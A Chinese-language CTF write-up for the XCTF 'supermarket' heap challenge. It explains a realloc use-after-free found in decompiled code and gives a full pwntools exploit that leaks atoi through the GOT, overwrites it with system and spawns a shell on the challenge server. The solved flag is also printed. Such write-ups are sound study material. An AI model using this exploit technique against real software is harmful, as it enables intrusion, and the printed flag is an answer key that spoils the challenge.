# supermarket

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=647c7095-b676-4851-903f-b25d0beb05fe_2)

有一只菜狗还是不会堆。

-   Arch:     i386-32-little
    <bR>RELRO:    Partial RELRO
    <br>Stack:    No canary found
    <br>NX:       NX enabled
    <br>PIE:      No PIE (0x8048000)

曾经的我只关心canary，现在做了几道堆后看见Partial RELRO也两眼放光——看了[wp](https://blog.csdn.net/seaaseesa/article/details/103093182)之后。继续看main。

```c
void Main(void)
{
  undefined4 uVar1;
  do {
    PrintMenu();
    printf("your choice>> ");
    uVar1 = GetInput();
    switch(uVar1) {
    default:
      puts("invalid choice");
      break;
    case 1:
      Add();
      break;
    case 2:
      Delete();
      break;
    case 3:
      List();
      break;
    case 4:
      ChangePrice();
      break;
    case 5:
      ChangeDescription();
      break;
    case 6:
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  } while( true );
}
```

为什么像这种给菜单的题基本都是堆呢？不管了，一个一个选项看一遍。

```c
void Add(void)

{
  int iVar1;
  void *pvVar2;
  int iVar3;
  undefined4 uVar4;
  char local_28 [16];
  int local_18;
  int local_14;
  int i;
  for (i = 0; (i < 0x10 && (*(int *)(&DAT_0804b080 + i * 4) != 0)); i = i + 1) {
  }
  if (i < 0x10) {
    printf("name:");
    SetInput(local_28,0x10);
    local_14 = GetInput(local_28);
    if (local_14 == -1) {
      local_14 = FUN_08048d95();
      if (local_14 == -1) {
        puts("no more space");
      }
      else {
        pvVar2 = malloc(0x1c);
        *(void **)(&DAT_0804b080 + local_14 * 4) = pvVar2;
        strcpy(*(char **)(&DAT_0804b080 + local_14 * 4),local_28);
        printf("name:%s\n",local_28);
        local_18 = 0;
        printf("price:");
        iVar3 = GetInput();
        local_18 = iVar3;
        printf("price:%d\n",iVar3);
        if ((0 < local_18) && (local_18 < 1000)) {
          *(int *)(*(int *)(&DAT_0804b080 + local_14 * 4) + 0x10) = local_18;
        }
        *(undefined4 *)(*(int *)(&DAT_0804b080 + local_14 * 4) + 0x14) = 0;
        while ((*(int *)(*(int *)(&DAT_0804b080 + local_14 * 4) + 0x14) < 1 ||
               (0x100 < *(int *)(*(int *)(&DAT_0804b080 + local_14 * 4) + 0x14)))) {
          printf("descrip_size:",iVar3);
          iVar1 = *(int *)(&DAT_0804b080 + local_14 * 4);
          uVar4 = GetInput();
          *(undefined4 *)(iVar1 + 0x14) = uVar4;
        }
        printf("descrip_size:%d\n",*(undefined4 *)(*(int *)(&DAT_0804b080 + local_14 * 4) + 0x14));
        iVar3 = *(int *)(&DAT_0804b080 + local_14 * 4);
        pvVar2 = malloc(*(size_t *)(*(int *)(&DAT_0804b080 + local_14 * 4) + 0x14));
        *(void **)(iVar3 + 0x18) = pvVar2;
        printf("description:");
        SetInput(*(undefined4 *)(*(int *)(&DAT_0804b080 + local_14 * 4) + 0x18),
                 *(undefined4 *)(*(int *)(&DAT_0804b080 + local_14 * 4) + 0x14));
      }
    }
    else {
      puts("name exist");
    }
  }
  else {
    puts("no more space");
  }
  return;
}
```

上面那个空白for语句绝了，还能这么计数？总之大佬们看出来了这有一个结构体。我马后炮看看也能发现一点端倪，但是没法这么清晰。DAT_0804b080是堆的所在地。**是[二级指针](https://segmentfault.com/a/1190000039297646)，也就是指向指针的指针，经典套娃。做了几道题我发现重要的一点：不需要完全读懂代码，可以靠经验猜测漏洞的位置，因为90%的代码都和实际要找的漏洞无关，或者只是辅助关系，也不用弄太清楚。

```c
void FreeCommodity(int param_1)
{
  if (*(int *)(&DAT_0804b080 + param_1 * 4) != 0) {
    *(undefined4 *)(*(int *)(&DAT_0804b080 + param_1 * 4) + 0x10) = 0;
    free(*(void **)(*(int *)(&DAT_0804b080 + param_1 * 4) + 0x18));
    free(*(void **)(&DAT_0804b080 + param_1 * 4));
  }
  *(undefined4 *)(&DAT_0804b080 + param_1 * 4) = 0;
  return;
}
```

这是Delete函数中的主要内容，ghidra喜欢把伪代码拆成一段一段的，看这个就好了。某某指针=0这个操作就是把相应指针置null，不给用uaf了。

```c
void List(void)
{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  void *__src;
  size_t sVar4;
  char local_331 [785];
  int i;
  memset(local_331,0,0x311);
  for (i = 0; i < 16; i = i + 1) {
    if (*(int *)(&DAT_0804b080 + i * 4) != 0) {
      sVar4 = strlen(*(char **)(*(int *)(&DAT_0804b080 + i * 4) + 0x18));
      if (sVar4 < 0x11) {
        uVar1 = *(undefined4 *)(*(int *)(&DAT_0804b080 + i * 4) + 0x18);
        uVar2 = *(undefined4 *)(*(int *)(&DAT_0804b080 + i * 4) + 0x10);
        uVar3 = *(undefined4 *)(&DAT_0804b080 + i * 4);
        sVar4 = strlen(local_331);
        sprintf(local_331 + sVar4,"%s: price.%d, des.%s\n",uVar3,uVar2,uVar1);
      }
      else {
        uVar1 = *(undefined4 *)(*(int *)(&DAT_0804b080 + i * 4) + 0x10);
        uVar2 = *(undefined4 *)(&DAT_0804b080 + i * 4);
        sVar4 = strlen(local_331);
        sprintf(local_331 + sVar4,"%s: price.%d, des.",uVar2,uVar1);
        __src = *(void **)(*(int *)(&DAT_0804b080 + i * 4) + 0x18);
        sVar4 = strlen(local_331);
        memcpy(local_331 + sVar4,__src,0xd);
        sVar4 = strlen(local_331);
        memcpy(local_331 + sVar4,&DAT_08049335,4);
      }
    }
  }
  puts("all  commodities info list below:");
  puts(local_331);
  return;
}
```

把所有商品的信息拼接到local_331后进行输出。没有我们可以控制的内容，暂且猜测漏洞不在这。

```c
void ChangePrice(void)
{
  int iVar1;
  int iVar2;
  iVar1 = GetCommodityName();
  if (iVar1 == -1) {
    puts("not exist");
  }
  else if ((*(int *)(*(int *)(&DAT_0804b080 + iVar1 * 4) + 0x10) < 1) ||
          (999 < *(int *)(*(int *)(&DAT_0804b080 + iVar1 * 4) + 0x10))) {
    puts("you can\'t change the price <= 0 or > 999");
  }
  else {
    printf("input the value you want to cut or rise in:");
    iVar2 = GetInput();
    if ((iVar2 < -20) || (20 < iVar2)) {
      puts("you can\'t change the price");
    }
    else {
      *(int *)(*(int *)(&DAT_0804b080 + iVar1 * 4) + 0x10) =
           iVar2 + *(int *)(*(int *)(&DAT_0804b080 + iVar1 * 4) + 0x10);
      if ((*(int *)(*(int *)(&DAT_0804b080 + iVar1 * 4) + 0x10) < 1) ||
         (999 < *(int *)(*(int *)(&DAT_0804b080 + iVar1 * 4) + 0x10))) {
        puts("bad guy! you destroyed it");
        FreeCommodity(iVar1);
      }
    }
  }
  return;
}
```

这里只能输入数字，不像是有东西的样子。

```c
void ChangeDescription(void)
{
  int iVar1;
  size_t local_10;
  iVar1 = GetCommodityName();
  if (iVar1 == -1) {
    puts("not exist");
  }
  else {
    local_10 = 0;
    while (((int)local_10 < 1 || (0x100 < (int)local_10))) {
      printf("descrip_size:");
      local_10 = GetInput();
    }
    if (*(size_t *)(*(int *)(&DAT_0804b080 + iVar1 * 4) + 0x14) != local_10) {
      realloc(*(void **)(*(int *)(&DAT_0804b080 + iVar1 * 4) + 0x18),local_10);
    }
    printf("description:");
    SetInput(*(undefined4 *)(*(int *)(&DAT_0804b080 + iVar1 * 4) + 0x18),
             *(undefined4 *)(*(int *)(&DAT_0804b080 + iVar1 * 4) + 0x14));
  }
  return;
}
```

新的知识点：realloc。了解realloc的用途后很容易就可以发现问题了。

- ### realloc
    > 尝试重新调整之前调用 malloc 或 calloc 所分配的 ptr 所指向的内存块的大小。
    - 声明：void *realloc(void *ptr, size_t size)
    - 参数
        > ptr -- 指针指向一个要重新分配内存的内存块，该内存块之前是通过调用 malloc、calloc 或 realloc 进行分配内存的。如果为空指针，则会分配一个新的内存块，且函数返回一个指向它的指针。<br>size -- 内存块的新的大小，以字节为单位。如果大小为 0，且 ptr 指向一个已存在的内存块，则 ptr 所指向的内存块会被释放，并返回一个空指针。
    - 返回值：返回一个指针 ，指向重新分配大小的内存。如果请求失败，则返回 NULL。

所以这个参数是有返回值的，可是程序中并没有接收返回值再设置的操作。realloc有以下情况。

1. 如果当前内存段后面有需要的内存空间，则直接扩展这段内存空间，realloc()将返回原指针。
2. 如果当前内存段后面的空闲字节不够，那么就使用堆中的第一个能够满足这一要求的内存块，将目前的数据复制到新的位置，并将原来的数据块释放掉，返回新的内存块位置。
3. 如果申请失败，将返回NULL，此时，原来的指针仍然有效。

注意：如果调用成功，不管当前内存段后面的空闲空间是否满足要求，都会释放掉原来的指针，重新返回一个指针，虽然返回的指针有可能和原来的指针一样，即不能再次释放掉原来的指针。

重点在第二条。如果没有连续的空闲段，那么会分配一个新的内存块，并将之前的释放掉。这个被释放的指针也是要置null的，但是这里没有。uaf在意料之外的地方出现了。先把exp放出来慢慢研究。

```python
from pwn import *
r = remote("61.147.171.105",62622)
atoi_got =134525000
def add1(index,size,content):
    r.sendlineafter('your choice>>','1')
    r.sendlineafter('name:',str(index))
    r.sendlineafter('price:','10')
    r.sendlineafter('descrip_size:',str(size))
    r.sendlineafter('description:',content)
def del1(index):
    r.sendlineafter('your choice>>','2')
    r.sendlineafter('name:',str(index))
def list1():
    r.sendlineafter('your choice>>','3')
def edit1(index,size,content):
    r.sendlineafter('your choice>>','5')
    r.sendlineafter('name:',str(index))
    r.sendlineafter('descrip_size:',str(size))
    r.sendlineafter('description:',content)
add1(0,0x80,'a'*0x10)
add1(1,0x20,'b'*0x10)
edit1(0,0x90,'')
add1(2,0x20,'d'*0x10)
payload = b'2'.ljust(16,b'\x00') + p32(20) + p32(0x20) + p32(atoi_got)
edit1(0,0x80,payload)
list1()
r.recvuntil('2: price.20, des.')
atoi_addr = u32(r.recvuntil(b'\n').split(b'\n')[0].ljust(4,b'\x00'))
libc_base = atoi_addr - 184400
system_addr = libc_base + 239936
edit1(2,0x20,p32(system_addr))
r.sendafter('your choice>>','/bin/sh\x00')
r.interactive()
```

首先分配一个chunk，这个chunk不能是fastbin范围，因为fastbin中不会发生切割，只有当申请的内存大小完全一致时才会分配。假如使用fastbin，description的大小只能设置为0x1c（结构体大小为0x1c）。通过edit函数可以发现只能输入n-1个字符，意味着最后一个字符一定是\x00，就没办法成功覆盖got表了。想预留一个位置也不行，因为大小不匹配就不分配了。

现在我们申请了一个拥有0x80大小description的商品，又随便申请了一个作为占位（空闲块之前会合并，而我们不想）。然后edit更改description大小，之前的description的指针就释放了，却没有置null。再增加一个商品，malloc结构体时就得到了之前description的指针。现在我们编辑第二个商品的description就是在编辑第三个商品的结构体，于是就能改指针了。第一次先改成atoi的got表，展示商品时就能打印出atoi的地址，从而计算libc基址。然后继续编辑，改成计算好的system地址，最后传入/bin/sh作为atoi的参数，但atoi已经被改成system了，于是成功getshell。

- ### Flag
  > cyberpeace{ea3e15b11160a3ac094724e7e420397e}